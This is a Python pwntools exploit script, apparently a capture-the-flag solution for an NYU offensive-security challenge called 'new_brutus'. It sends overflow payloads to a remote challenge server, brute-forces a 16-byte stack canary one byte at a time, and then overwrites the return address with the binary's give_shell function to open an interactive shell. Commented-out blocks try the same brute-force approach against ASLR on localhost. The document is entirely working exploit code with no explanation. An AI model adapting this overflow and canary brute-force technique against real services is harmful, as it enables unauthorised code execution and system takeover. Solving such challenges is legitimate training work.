from pwn import *



context.log_level = 'warn'

magic = b'\x00'

while len(magic) < 16:
    for char in range(256):
        #print(f"trying {bytes([char])}")
        r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
        out = r.recvuntil(b'):')
        #print(out)
        r.send(b'rt1726\n')
        #r.sendafter(b'):', b'rt1726')
        out = r.recvuntil(b'name?\n\x00')
        #print(out)
        r.send(str(136 + len(magic) + 1).encode())
        out = r.recvuntil(b'of data\n')
        #print(out)
        r.send(b'B'*136 + magic + bytes([char]))

        #r.interactive()
        try:
            out = r.recvuntil(b'goodbye')
        #if b'goodbye' in out:
            magic += bytes([char])
            print("Found",magic,"\n")
            break
        except:
            continue
        finally:
            r.close()

print("magic:", magic)
'''
aslr = b'\x76'
while len(aslr) < 8:
    for char in range(256):
        #print(f"trying {bytes([char])}")
        r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
        r.sendafter(b'name?\n\x00', str(136 + len(magic) + len(aslr) + 1))
        r.sendafter(b'of data\n', b'B'*136 + magic + aslr + bytes([char]))

        #r.interactive()
        try:
            out = r.recvuntil(b'goodbye')
        #if b'goodbye' in out:
            aslr += bytes([char])
            print("Found",aslr,"\n")
            break
        except:
            continue
print("aslr:", aslr)
'''
e = ELF('./new_brutus')
#base = u64(aslr) - 0x1276
#e.symbols['give_shell']
r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
out = r.recvuntil(b'):')
print(out)
r.send(b'rt1726\n')
r.sendafter(b'name?\n\x00', str(136 + len(magic) + 8).encode())
r.sendafter(b'of data\n', b'B'*136 + magic + p64(e.symbols['give_shell']))
r.interactive()
'''
#0x401276

aslr = b'\x76'
while len(aslr) < 8:
    for char in range(256):
        print(f"trying {bytes([char])}")
        r = remote('localhost', 8000)
        r.sendafter(b'name?\n\x00', b'145')
        r.sendafter(b'of data\n', b'B'*136 + magic + b'A'*8 + aslr + bytes([char]))

        #r.interactive()
        try:
            out = r.recvuntil(b'goodbye')
        #if b'goodbye' in out:
            aslr += bytes([char])
            print("Found",aslr,"\n")
            break
        except:
            continue
print(aslr)
'''
'''
e = ELF('./new_brutus')
print("give_shell:", hex(e.symbols['give_shell']))
r = remote('localhost', 8000)
r.sendafter(b'name?\n\x00', b'152')
r.sendafter(b'of data\n', b'B'*136 + magic + b'A'*8 + p64(e.symbols['give_shell']))
r.interactive()
'''
